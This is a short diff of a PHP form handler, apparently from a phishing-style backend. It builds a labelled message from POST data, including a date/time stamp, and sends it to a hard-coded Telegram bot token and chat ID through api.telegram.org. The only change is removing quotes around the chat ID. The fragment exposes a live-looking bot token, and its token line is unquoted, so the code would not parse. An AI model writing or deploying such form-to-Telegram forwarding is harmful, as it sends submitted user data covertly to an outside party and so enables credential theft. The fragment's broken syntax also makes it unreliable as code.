@@ -55,7 +55,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        
 
         $botToken = 7916266742:AAGg1HaOLst8wMyTSptCJolr4-wSyoLgdmE;
-        $chatId = '-2424448597';
+        $chatId = -2424448597;
 
         $mensagem = urlencode($conteudo);
         $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";
